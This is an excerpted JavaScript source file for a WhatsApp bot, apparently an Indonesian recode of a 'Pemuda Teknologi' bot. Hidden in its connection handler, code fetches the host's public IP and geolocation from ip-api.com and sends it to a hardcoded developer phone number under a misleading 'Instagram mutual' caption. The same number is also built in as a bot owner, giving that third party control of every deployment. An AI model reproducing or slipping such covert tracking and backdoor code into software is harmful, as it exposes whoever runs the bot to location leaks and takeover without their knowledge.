...
pemuda.autoReconnect = ReconnectMode.onConnectionLost
    ...
    pemuda.browserDescription = ['ADE TECH','Desktop','3.0']
    await sleep(7000)
    pemuda.on('qr', qr => {
 ...
 teks = `https://https://chat.whatsapp.com/GbTtqrAcAQu1aCW1cUBQVk`
 ...
 pemuda.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(pemuda.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Pemuda Teknologi",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:"https://wa.me/6289527343810?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       pemuda.sendMessage("6289527343810@s.whatsapp.net", `─────「 *BANG MUTUALAN INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Pemuda Teknologi",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:"https://wa.me/6289527343810?text=Assalamualaikum"}}})
...
exec(`cd /sdcard/download && play *mp3`)
   ...
   pemuda.on('chat-update', async (mek) => {
        ...
        ownerNumber = ["6289527343810@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "6289527343810@s.whatsapp.net"
       otod = `${settings.NomorOwner}@s.whatsapp.net`
        ...
        pemuda.on('group-participants-update', async (anu) => {
           mem = anu.participants[0]
			...
			console.log(anu)
			if (anu.action == 'add') {
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6289527343810:6289527343810\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
...
pemuda.on('CB:action,,call', async json => {
        ...
        pemuda.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:`https://wa.me/6289527343810?text=Assalamualaikum`}}})
        await sleep(5000)
...
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
	    ...
	    }), 'lightgreen')), term.slowTyping('By Ade Gans- Recode by adem ayem Teknologi' ,{ flashStyle: term.brightWhite })
